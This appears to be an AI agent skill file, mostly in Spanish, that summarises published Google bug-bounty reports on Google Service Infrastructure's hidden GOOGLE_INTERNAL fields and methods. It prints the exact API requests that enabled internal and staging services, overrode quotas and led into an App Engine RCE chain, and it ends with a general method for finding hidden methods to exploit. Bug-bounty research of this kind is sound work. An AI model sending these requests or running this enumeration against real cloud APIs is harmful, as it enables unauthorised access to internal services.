---
name: bughunters-gsi
description: 'Google VRP reports by Ezequiel Pereira — Google Service Infrastructure (GSI/ESF) hidden fields and methods protected by GOOGLE_INTERNAL visibility label. Bug 1 — enable any internal Google service via POST /v1/services/<project>/configs with dependsOnServices ($5k, 2016-2018). Bug 2 — enable almost any service + override limits via POST /v1/services with staging serviceConfig.name ($7.5k, 2017). Detection — hidden field returns JSON error vs silent ignore; hidden method returns 404 JSON vs HTML broken-robot page. Spanish triggers — "google service infrastructure", "gsi gcp", "visibility labels google", "google_internal label", "servicemanagement api", "dependsonservices gcp", "enable internal service gcp", "esf google", "staging appengine sandbox googleapis", "service infrastructure bug".'
---

## Google Service Infrastructure (GSI/ESF) — Bug Series (Ezequiel Pereira)

**¿Qué es GSI?** Plataforma interna de Google que crea y gestiona configuraciones de APIs desplegando "service configurations". También habilita/deshabilita APIs en proyectos GCP (tanto user-defined como las propias de Google).

**Configuración de ejemplo (Google Calendar API):**
```yaml
type: google.api.Service
configVersion: 3
name: calendar.googleapis.com
title: Google Calendar API
apis:
- name: google.calendar.v3.Calendar
authentication:
  providers:
  - id: google_calendar_auth
    jwksUri: https://www.googleapis.com/oauth2/v1/certs
    issuer: https://securetoken.google.com
rules:
- selector: "*"
  requirements:
    providerId: google_calendar_auth
```

**Key insight:** Las APIs de Google tienen settings especiales (hidden) que los usuarios normales no conocen. Están referenciadas ocasionalmente en docs públicos (ej. campos `useDirectDownload`, `mimeTypes[]`, `systemTypes[]` que mencionan "ESF" — solo visibles para Google-internal clients).

---

### Visibility Labels — mecanismo central

El label `GOOGLE_INTERNAL` protege campos y métodos de la API pública. Un cliente externo no puede verlos ni usarlos, solo clientes con ese label.

**Detección de campo oculto:**
```
Mi cliente    → Server: Set el campo <name> a <value>
Server        → Mi cliente: "The field <name> does not exist"  ← error

Google client → Server: Set el campo <name> a <value>
Google client ← Server: Done
```
**Tip:** A veces el server simplemente ignora el campo (en lugar de error) — eso también confirma que existe, porque un campo truly inexistente siempre da error.

**Detección de método oculto:**
```
Mi cliente    → Server: Llamar <method>
Server        → Mi cliente: 404 NOT FOUND  (respuesta JSON)

Google client → Server: Llamar <method>
Google client ← Server: Done
```
**Tip crítico:** La respuesta 404 para un método oculto es **JSON**. La respuesta para un método realmente inexistente es una **página HTML con un robot roto**. Usar esto para enumerar métodos ocultos.

---

### Cómo descubrir estos campos/métodos

**Método principal — Google Cloud Console (console.cloud.google.com):**
1. Abrir DevTools → Network tab
2. Navegar por la consola y buscar requests a `servicemanagement.clients...`
3. El frontend de la consola usa clientes internos que tienen acceso GOOGLE_INTERNAL
4. Observar los payloads para ver campos/métodos que no aparecen en la documentación pública

---

### Bug 1 — Habilitar cualquier servicio interno ($5k, 2016-2018)

**Endpoint:** `servicemanagement.googleapis.com`

**Request:**
```
POST /v1/services/the-expanse.appspot.com/configs

{
  "name": "the-expanse.appspot.com",
  "producerProjectId": "the-expanse",
  "usage": {
    "dependsOnServices": [
      "takeout-pa.googleapis.com",
      "staging-appengine.sandbox.googleapis.com",
      "staging-appengineservice-json.sandbox.googleapis.com",
      "issuetracker.corp.googleapis.com"
    ]
  },
  "configVersion": 3
}
```

**Impacto:** Tu proyecto GCP puede usar servicios internos de Google normalmente no accesibles para developers externos, incluyendo servicios staging de App Engine y el issue tracker interno.

---

### Bug 2 — Habilitar casi cualquier servicio + override de límites ($7.5k, 2017)

**Request:**
```
POST /v1/services

{
  "serviceName": "fake.endpoints.the-expanse.cloud.goog",
  "producerProjectId": "the-expanse",
  "serviceConfig": {
    "name": "staging-cloudresourcemanager.sandbox.googleapis.com",
    "producerProjectId": "the-expanse",
    "configVersion": 2,
    "legacy": {
      "email": "eze2307@gmail.com",
      "oncall": "eze2307@gmail.com",
      "mdb": "security"
    }
  }
}
```

**Impacto:** 
- Activar casi cualquier servicio interno de Google en el proyecto propio
- Override de límites (quotas) de servicios
- El campo `legacy` con `email/oncall/mdb` convierte al atacante en "productor" del servicio

---

### Cadena GSI → GAE RCE (chaining de bugs)

El Bug 1 de GSI fue prerequisito para la cadena de $36k RCE en GAE:

```
POST /v1/services/the-expanse.appspot.com/configs

{
  "name": "the-expanse.appspot.com",
  "producerProjectId": "the-expanse",
  "usage": {
    "dependsOnServices": [
      "staging-appengine.sandbox.googleapis.com",
      "staging-appengineservice-json.sandbox.googleapis.com"
    ]
  },
  "configVersion": 3
}
```

Esto habilitó acceso al staging environment de GAE, donde las APIs internas (stubby, app_config_service) estaban sin restricciones → RCE.

Ver skill `bughunters-gae-rce` para la cadena completa.

---

### Pattern generalizable

1. Interceptar tráfico del Google Cloud Console con DevTools
2. Buscar campos en requests que no aparecen en la documentación pública
3. Probar enviar esos campos con valores propios — si el server los ignora (no da error), el campo existe pero está oculto por GOOGLE_INTERNAL
4. Buscar métodos que devuelven 404 JSON (no HTML) — son métodos ocultos que se pueden intentar explotar
5. En `servicemanagement` API, buscar configuraciones de staging (`*.sandbox.googleapis.com`) y servicios corp (`*.corp.googleapis.com`)
